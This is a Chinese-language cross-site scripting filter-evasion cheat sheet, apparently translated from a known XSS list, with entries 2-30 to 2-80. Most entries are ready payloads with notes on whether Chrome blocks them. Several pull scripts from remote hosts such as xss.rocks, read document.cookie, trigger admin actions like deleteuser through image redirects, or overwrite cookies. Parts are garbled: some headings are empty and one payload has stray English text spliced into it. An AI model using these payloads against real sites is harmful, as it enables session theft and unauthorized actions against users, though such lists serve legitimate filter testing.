### 2-30 双尖括号<（chrome即可测试）
在正常标签后面使用一个左尖括号< 代替 右尖括号>，就可以用远程脚本攻击正常页面，比如直接用远程攻击脚本内容代替正常页面上的表单，从而直接获取用户提交的信息。没有左尖括号时，在 Firefox 中生效，而在 Netscape 中无效。

`<iframe src=http://xss.rocks/scriptlet.html <`

### 2-31 javascript双重转义
当应用将一些用户输入输出到例如：<SCRIPT>var a=”$ENV{QUERY_STRING}”;</SCRIPT>的JavaScript中时，你想注入你的JavaScript脚本，你可以通过转义转义字符来规避服务器端转义引号。注入后会得到<SCRIPT>vara=”\\”;alert(‘XSS’);//”;</SCRIPT>，这时双引号不会被转义并且可以触发跨站脚本攻击向量。XSS定位器就用了这种方法:

`\";alert('XSS');//`

另一种方法是，直接使用script闭合标签，并开始自己的script脚本块：

`</script><script>alert('XSS');</script>`

### 2-32 </TITLE>（chrome即可测试）
这是一个简单的闭合<TITLE>标签的 XSS 攻击向量，可以包含恶意的跨站脚本攻击:

`</TITLE><SCRIPT>alert("XSS");</SCRIPT>`
### 2-33 INPUT标签中设置image（chrome测试无效）
`<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">`

### 2-34 BODY标签中设置image（chrome测试无效）
`<BODY BACKGROUND="javascript:alert('XSS')">`

### 2-35 IMG标签的Dynsrc属性（chrome测试无效）
`<IMG DYNSRC="javascript:alert('XSS')">`

`（注意：该属性只在IE和Netscape中支持，img dynsrc可以用来插入各种多媒体，格式可以是Wav、Avi、AIFF、AU、MP3、Ra、Ram等等）`

### 2-36 IMG标签的lowsrc属性（chrome测试无效）
`<IMG LOWSRC="javascript:alert('XSS')">`

`（注意：该属性用于设置低分辨率下的图片）`

### 3-37 列表样式设置图片（chrome测试无效）
使用JavaScript伪协议在列表List中嵌入图片，这种情况只在IE浏览器中有用

`<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS</br>`

### 2-38 图片标签中使用VBscript片（chrome测试无效）
`<IMG SRC='vbscript:msgbox("XSS")'>`

`（注意：在 IE 中除了支持 JavaScript 外，还支持 VBScript,但是 Firefox、Chrome 中是不支持 VBScript 的）`

### 2-39 Livescript（chrome测试无效,仅限旧版本的Netscape浏览器）
`<IMG SRC="livescript:[code]">`

`（注意：LiveScript是JavaScript语言的前身）`

### 2-40 Svg对象标签 (chrome测试生效)
`<svg/onload=alert('XSS')>`

### 2-41 es6 (chrome测试无效)
`Set.constructor`alert\x28document.domain\x29````

### 2-42 body标签 (chrome测试生效)

`<BODY ONLOAD=alert('XSS')>`

### 2-43 事件处理程序

### 2-44 BGSOUND (chrome测试无效)

`<bgsound>是IE浏览器中设置网页背景音乐的元素。该特性是非标准的，请尽量不要在生产环境中使用它！`

### 2-45 & JavaScript includes (chrome测试无效)

`<BR SIZE="&{alert('XSS')}">`

### 2-46 stylesheet样式表引入 (chrome测试无效)

`<LINK REL="stylesheet" HREF="javascript:alert('XSS');">`

### 2-47 远程样式表 （chrome测试无效）

`<LINK REL="stylesheet" HREF="http://xss.rocks/xss.css">`

### 2-48 远程样式表2 (chrome测试无效)
`<STYLE>@import'http://xss.rocks/xss.css';</STYLE>`

### 2-49 远程样式表3 （chrome测试无效）

`<META HTTP-EQUIV="Link" Content="<http://xss.rocks/xss.css>; REL=stylesheet">`

### 2-50 远程样式表4 (chrome测试无效)

`<STYLE>BODY{-moz-binding:url("http://xss.rocks/xssmoz.xml#xss")}</STYLE>`


### 2-51








### 2-60 META
META标签可以设置刷新，这个刷新功能比较奇怪的是并不会在头部中发送一个referrer，所以它通常用于不需要 referrer 的时候:

比如下面的刷新跳转在chrome中可以生效：

`<meta http-equiv="Refresh" content="3;url=http://www.haishui.NET">`

比如下面的刷新已经被chrome拦截，并不会发生：

`<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">`

#### 2-60-1 使用编码数据的META
URL scheme 指令。这个非常有用因为它并不包含任何可见的 SCRIPT 单词或 JavaScript 指令,因为它使用了 base64 编码.请查看 RFC 2397 寻找更多细节。你同样可以使用具有 Base64 编码功能的 XSS 工具来编码 HTML 或 JavaScript:

`<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">`

`（注意：chrome浏览器已经拦截data形式的刷新）`

#### 2-60-2 含有额外URL参数的META
如果目标站点尝试检查 URL 是否包含"http://"，你可以用以下技术规避它(由 Moritz Naumann 提交):

`<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert ('XSS');">`

`（注意：在chrome中，会发生刷新，刷新到空白页about:blank，javascript指令alert事件并不会发生）`

### 2-61 IFRAME（chrome即可测试）
如果可以使用Iframe，也会有很多 XSS 问题:

`<IFRAME SRC="javascript:alert('XSS');"></IFRAME>`

### 2-62 基于事件IFRAME（chrome即可测试）
Iframes 和大多数其他元素可以使用下列事件(由 David Cross 提交):

`<IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>`

### 2-63 FRAME（chrome即可测试）
Frames 和 iframe 一样有很多 XSS 问题:
`
<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>`

`（注意：FRAMESET标签不能和body标签一起使用）`

### 2-64 TABLE（chrome测试无效）
`<TABLE BACKGROUND="javascript:alert('XSS')">`
#### 2-64-1 TD（chrome测试无效）
和上面一样，TD 也可以通过 BACKGROUND 来包含 JavaScript XSS 攻击向量:

`<TABLE><TD BACKGROUND="javascript:alert('XSS')">`

### 2-65 DIV
#### 2-65-1  DIV背景图像（chrome测试无效）
`<DIV STYLE="background-image: url(javascript:alert('XSS'))">`
#### 2-65-2  使用Unicode XSS代码设置 DIV 背景图像（chrome测试无效）
这进行了一些修改来混淆 URL 参数。原始的漏洞是由 Renaud Lifchitz 在 Hotmail 发现的:

`<DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029">`
#### 2-65-3  含有额外字符的DIV背景图像（chrome测试无效）
Rnaske 进行了一个快速的 XSS 模糊测试来发现 IE 和安全模式下的 Netscape 8.1 中任何 可以在左括号和 JavaScript 指令间加入的额外字符。这都是十进制的但是你也可以使用十 六进制来填充(以下字符可用:1-32, 34, 39, 160, 8192-8.13, 12288, 65279):

`<DIV STYLE="background-image: url(&#1;javascript:alert('XSS'))">`

`（注意：chrome测试的时候，均提示css属性值不对，chrome测试均无效）`

#### 2-65-4 DIV表达式（chrome测试无效）
一个非常有效的对抗现实中的跨站脚本过滤器的变体是在冒号和"expression"之间添加一个换行:

`<DIV STYLE="width: expression(alert('XSS'));">`

### 2-66 html条件选择注释块（chrome测试无效，尽在IE5.0 及更高版本和 IE 渲染引擎模式下的 Netscape 8.1 生效）
只能在 IE5.0 及更高版本和 IE 渲染引擎模式下的 Netscape 8.1 生效。一些网站认为在注释 中的任何内容都是安全的并且认为没有必要移除，这就允许我们添加跨站脚本攻击向量。系 统会在一些内容周围尝试添加注释标签以便安全的渲染它们。如我们所见，这有时并不起作用:

`<!--[if gte IE 4]>
 <SCRIPT>alert('XSS');</SCRIPT>
 <![endif]-->`
 
 ### 2-67 BASE标签（chrome测试并不会弹出alert）
 在 IE 和安全模式下的 Netscape 8.1 有效。你需要使用//来注释下个字符，这样你就不会造 成 JavaScript 错误并且你的 XSS 标签可以被渲染。同样，这需要当前网站使用相对路径例如"images/image.jpg"来放置图像而不是绝对路径。如果路径以一个斜杠开头例如 "/images/image.jpg"你可以从攻击向量中移除一个斜杠(只有在两个斜杠时注释才会生效):
 
 `<BASE HREF="javascript:alert('XSS');//">`
 
 `（注意：<base> 标签为页面上的所有链接规定默认地址或默认目标。）`
 
 ### 2-68 OBJECT标签（chrome即可测试）
 如果允许使用OBJECT，你可以插入一个xss攻击变量来攻击用户，类似于 APPLET 标签。链接文件实际是含有你 XSS 攻击代码的 HTML 文件:
 
 `<OBJECT TYPE="text/x-scriptlet" DATA="http://xss.rocks/scriptlet.html"></OBJECT>`
 
 ### 2-69 使用EMBED标签加载含有XSS的FLASH文件
 下面有一个例子,如果你添加了属性 allowScriptAccess="never"以及 allownetworking="internal"则可以 减小风险(感谢 Jonathan Vanasco 提供的信息):
 
 `<EMBED SRC="http://ha.ckers.Using an EMBED tag you can embed a Flash movie that contains XSS. Click here for a demo. If you add the attributes allowScriptAccess="never" and allownetworking="internal" it can mitigate this risk (thank you to Jonathan Vanasco for the info).:
org/xss.swf" AllowScriptAccess="always"></EMBED>`

### 2-70 使用 EMBED SVG 包含攻击向量（chrome即可测试）
该示例只在 FireFox 下有效，但是比上面的攻击向量在 FireFox 下好，因为不需要用户安装 或启用 FLASH。感谢 nEUrOO 提供:

`<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>`

### 2-71 在FLASH中使用ActionScript混淆XSS攻击向量(暂时未测试)
`a="get";
b="URL(\"";
c="javascript:";
d="alert('XSS');\")";
eval(a+b+c+d);`
### 2-72 CDATA混淆的XML数据岛（只在 IE 和使用 IE 渲染模式的 Netscape 8.1 下有效）
这个 XSS 攻击只在 IE 和使用 IE 渲染模式的 Netscape 8.1 下有效-攻击向量由 Sec Consult 在审计 Yahoo 时发现

`<XML ID="xss"><I><B><IMG SRC="javas<!-- -->cript:alert('XSS')"></B></I></XML>
<SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>`

### 2-73 使用XML数据岛生成含内嵌JavaScript的本地XML文件（只在 IE 和使用 IE 渲染模式的 Netscape 8.1 下有效）
这和上面是一样的,但是将来源替换为了包含跨站脚本攻击向量的本地XML文件(必须在同一服务器上):

`<XML SRC="xsstest.xml" ID=I></XML>
<SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>`

### 2-74 XML中使用HTML+TIME（只在 IE 和 IE 渲染模式下的 Netscape 8.1 有效）
这是 Grey Magic 攻击 Hotmail 和 Yahoo 的方法。这只在 IE 和 IE 渲染模式下的 Netscape 8.1 有效并且记得需要在 HTML 域的 BODY 标签中间才有效:


### 2-75 使用一些字符绕过".js"过滤

你可以将你的JavaScript文件重命名为图像来进行 XSS攻击:

`<SCRIPT SRC="http://xss.rocks/xss.jpg"></SCRIPT>`

### 2-76 SSI(Server Side Includes)
这需要在服务器端允许 SSI 来使用 XSS 攻击向量。似乎不用提示这点，因为如果你可以在 服务器端执行指令那一定是有更严重的问题存在:

`<!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=http://xss.rocks/xss.js></SCRIPT>'"-->`

### 2-77 PHP
需要服务器端安装了 PHP 来使用 XSS 攻击向量。同样，如果你可以远程运行任意脚本，那 会有更加严重的问题

`<? echo('<SCR)';
echo('IPT>alert("XSS")</SCRIPT>'); ?>`

### 2-78 嵌入命令的IMAGE
当页面受密码保护并且这个密码保护同样适用于相同域的不同页面时有效，这可以用来进行 删除用户，增加用户(如果访问页面的是管理员的话)，将密码发送到任意地方等等。。这 是一个较少使用但是更有价值的 XSS 攻击向量:

`<IMG SRC="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode">`

### 2-78-1 嵌入命令的IMAGE 第二部分
这更加可怕因为这不包含任何可疑标识，除了它不在你自己的域名上。这个攻击向量使用一个 302 或 304(其他的也有效)来重定向图片到指定命令。所以一个普通的<IMG SRC="httx://badguy.com/a.jpg">对于访问图片链接的用户来说也有可能是一个攻击向 量。下面是利用.htaccess(Apache)配置文件来实现攻击向量。(感谢 Timo 提供这部分。):

 `Redirect 302 /a.jpg http://victimsite.com/admin.asp&deleteuser`
 
 ### 2-79 Cookie篡改
 尽管公认不太实用，但是还是可以发现一些允许使用 META 标签的情况下可用它来覆写cookie。另外的例子是当用户访问网站页面时，一些网站读取并显示存储在 cookie 中的用户名，而不是数据库中。当这两种场景结合时，你可以修改受害者的 cookie 以便将 JavaScript 注入到其页面中(你可以使用这个让用户登出或改变他们的用户状态，甚至可以 让他们以你的账户登录):
 
 `<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert('XSS')</SCRIPT>">`
 
 `(注意：chrome已经拦截该形式)`
 
 ### 2-80 UTF-7编码
 如果存在 XSS的页面没有提供页面编码头部，或者使用了任何设置为使用 UTF-7 编码的浏 览器，就可以使用下列方式进行攻击(感谢 Roman Ivanov 提供)。这在任何不改变编码类 型的现代浏览器上是无效的，这也是为什么标记为完全不支持的原因。Watchfire 在 Google 的自定义 404 脚本中发现这个问题:
 
 ` <HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-`
